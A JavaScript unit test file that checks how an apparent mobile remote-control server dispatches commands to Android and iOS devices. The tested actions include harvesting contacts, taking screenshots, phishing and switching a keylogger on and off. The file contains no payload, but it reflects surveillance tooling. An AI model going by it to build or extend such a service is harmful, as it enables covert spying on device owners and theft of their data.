/**
 * Unit tests for ActionService
 */

const ActionService = require('../../../services/actionService');
const { NotFoundError, ValidationError } = require('../../../utils/errors');
const {
  createMockIo,
  createMockDeviceService,
  createTestDevice,
} = require('../../helpers/mockFactories');

describe('ActionService', () => {
  let actionService;
  let mockDeviceService;
  let mockIo;

  beforeEach(() => {
    mockIo = createMockIo();
    mockDeviceService = createMockDeviceService();
    actionService = new ActionService(mockDeviceService, mockIo);
  });

  describe('executeAction', () => {
    it('should throw NotFoundError when device is not connected', async () => {
      mockDeviceService.isDeviceConnected.mockReturnValue(false);

      await expect(
        actionService.executeAction('device-id', 'contacts', {})
      ).rejects.toThrow(NotFoundError);
    });

    it('should throw ValidationError when action is not a string', async () => {
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'android' },
      });

      await expect(
        actionService.executeAction('device-id', null, {})
      ).rejects.toThrow(ValidationError);

      await expect(
        actionService.executeAction('device-id', 123, {})
      ).rejects.toThrow(ValidationError);
    });

    it('should throw ValidationError when action is not supported on platform', async () => {
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'ios' },
      });

      // Mock platformActions to return false for phishing on iOS
      jest.mock('../../../config/platformActions', () => ({
        isActionSupported: jest.fn().mockReturnValue(false),
        getPlatformActionName: jest.fn().mockReturnValue('phishing'),
      }));

      await expect(
        actionService.executeAction('device-id', 'phishing', {})
      ).rejects.toThrow(ValidationError);
    });

    it('should execute action successfully for Android device', async () => {
      const deviceId = 'android-device';
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'android' },
      });

      const result = await actionService.executeAction(deviceId, 'contacts', {});

      expect(result.success).toBe(true);
      expect(result.platform).toBe('android');
      expect(mockDeviceService.emitToDevice).toHaveBeenCalled();
    });

    it('should execute action successfully for iOS device', async () => {
      const deviceId = 'ios-device';
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'ios' },
      });

      const result = await actionService.executeAction(deviceId, 'contacts', {});

      expect(result.success).toBe(true);
      expect(result.platform).toBe('ios');
      expect(mockDeviceService.emitToDevice).toHaveBeenCalled();
    });

    it('should convert object params to extras array', async () => {
      const deviceId = 'test-device';
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'android' },
      });

      const params = { message: 'Hello', duration: 1000 };
      await actionService.executeAction(deviceId, 'toast', params);

      expect(mockDeviceService.emitToDevice).toHaveBeenCalledWith(
        deviceId,
        'commend',
        expect.objectContaining({
          extras: expect.arrayContaining([
            { key: 'message', value: 'Hello' },
            { key: 'duration', value: 1000 },
          ]),
        })
      );
    });

    it('should use array params as-is', async () => {
      const deviceId = 'test-device';
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'android' },
      });

      const params = [{ key: 'test', value: 'data' }];
      await actionService.executeAction(deviceId, 'toast', params);

      expect(mockDeviceService.emitToDevice).toHaveBeenCalledWith(
        deviceId,
        'commend',
        expect.objectContaining({
          extras: params,
        })
      );
    });

    it('should update keylogger status when toggling keylogger', async () => {
      const deviceId = 'test-device';
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'android' },
      });

      await actionService.executeAction(deviceId, 'keylogger-on', {});
      expect(mockDeviceService.updateDeviceData).toHaveBeenCalledWith(
        deviceId,
        'keylogger-status',
        { enabled: true }
      );

      await actionService.executeAction(deviceId, 'keylogger-off', {});
      expect(mockDeviceService.updateDeviceData).toHaveBeenCalledWith(
        deviceId,
        'keylogger-status',
        { enabled: false }
      );
    });

    it('should handle action with empty params', async () => {
      const deviceId = 'test-device';
      mockDeviceService.isDeviceConnected.mockReturnValue(true);
      mockDeviceService.getDeviceById.mockResolvedValue({
        info: { platform: 'android' },
      });

      const result = await actionService.executeAction(deviceId, 'screenshot', null);
      expect(result.success).toBe(true);
      expect(mockDeviceService.emitToDevice).toHaveBeenCalledWith(
        deviceId,
        'commend',
        expect.objectContaining({
          extras: [],
        })
      );
    });
  });

  describe('getAvailableActions', () => {
    it('should return all actions when no platform specified', () => {
      const actions = actionService.getAvailableActions();
      expect(Array.isArray(actions)).toBe(true);
      expect(actions.length).toBeGreaterThan(0);
    });

    it('should return platform-specific actions for Android', () => {
      const actions = actionService.getAvailableActions('android');
      expect(Array.isArray(actions)).toBe(true);
    });

    it('should return platform-specific actions for iOS', () => {
      const actions = actionService.getAvailableActions('ios');
      expect(Array.isArray(actions)).toBe(true);
    });

    it('should filter out unsupported actions for platform', () => {
      const androidActions = actionService.getAvailableActions('android');
      const iosActions = actionService.getAvailableActions('ios');
      
      // iOS doesn't support phishing
      expect(androidActions).toContain('phishing');
      // Note: This depends on platformActions config
    });
  });
});

